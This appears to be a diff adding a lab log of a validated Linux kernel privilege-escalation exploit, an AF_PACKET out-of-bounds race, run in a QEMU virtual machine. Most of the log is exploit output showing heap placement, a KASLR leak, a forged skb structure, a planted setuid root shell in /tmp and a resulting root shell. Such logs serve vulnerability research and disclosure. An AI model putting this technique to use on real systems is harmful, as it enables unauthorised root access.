@@ -1,0 +1,49 @@
+Validated vulnerable run
+Date: 2026-08-13
+Source commit: 92d3817649df2b0b6a008a686c8275c88d7ef594
+Kernel: Linux 7.2.0-rc3+ #4 SMP PREEMPT x86_64
+QEMU: KVM, -cpu host, 4 vCPUs, 5 GiB
+Kernel command line: console=ttyS0 root=/dev/vda1 rootfstype=ext4 ro panic=0 quiet loglevel=1 init=/bin/bash --
+
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+$ grep -E '^Cap(Inh|Prm|Eff|Amb):' /proc/self/status
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapAmb: 0000000000000000
+$ ./build/03390aa-packet-oob --exploit
+[*] AF_PACKET hard_header_len race trigger
+[*] exploit child entering private user/network namespaces
+[*] supervisor pid=231 remains in the initial user namespace
+[+] bond0=8; exploit topology ready
+[+] built 30 IP6GRE and 6 VXLAN-GPE layers; old=41 new=47
+[*] phase-1 placement attempt 1/8
+[-] no source-filter sl_count corruption found in this attempt
+[*] phase-1 placement attempt 2/8
+[-] no source-filter sl_count corruption found in this attempt
+[*] phase-1 placement attempt 3/8
+[-] no source-filter sl_count corruption found in this attempt
+[*] phase-1 placement attempt 4/8
+[+] corrupted source filter 12: sl_count=16384 (expected 240)
+[+] KASLR anchor net_sysctl_root=0xffffffff92283ca0; slide=0xe000000
+[+] controlled fake skb in persistent marker 0x584f0057: address=0xffff8d2846d5b480 uarg=0xffff8d2846d5b4a8
+[+] verified the AF_UNIX guard in the adjacent slot
+[*] phase-2 placement attempt 1/8
+[+] phase 2 reset sl_count to 240
+[*] phase-3 placement attempt 1/8
+[+] target head occupies the slot immediately after the victim
+[+] appended a complete 48-byte skb_shared_info prefix
+[+] verified forged skb_shared_info at the target boundary
+[*] receiving target skb to invoke the corrupted callback
+[+] callback returned with uid=0 euid=0
+[+] privileged child installed /tmp/packet-oob-rootsh (owner 0, mode 4755)
+[+] keeping the credential backing object alive for the parent
+[+] initial-namespace root artifact verified; executing proof
+[ROOT] uid=0 euid=0 gid=0 egid=0
+[ROOT] interactive initial-namespace shell ready
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@packet-oob-lab:/tmp/poc# id
+uid=0(root) gid=0(root) groups=0(root)
+root@packet-oob-lab:/tmp/poc#
